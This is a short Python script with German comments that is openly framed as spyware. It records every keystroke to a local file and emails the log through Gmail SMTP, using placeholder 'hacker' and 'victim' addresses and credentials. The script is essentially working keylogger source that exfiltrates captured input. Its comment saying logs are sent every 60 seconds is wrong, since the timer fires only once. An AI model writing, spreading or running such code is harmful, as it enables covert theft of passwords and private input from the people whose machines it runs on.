import keyboard
import smtplib
from threading import Timer

def send_logs():
    # Logs per E-Mail senden (wie bei Spyware)
    with open("keylog.txt", "r") as f:
        logs = f.read()
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login("hacker@gmail.com", "password")  # (Fake-Daten)
    server.sendmail("hacker@gmail.com", "victim@example.com", logs)
    server.quit()

# Tastenanschläge aufzeichnen
keyboard.on_release(lambda e: open("keylog.txt", "a").write(f"{e.name} "))
Timer(60, send_logs).start()  # Alle 60 Sekunden senden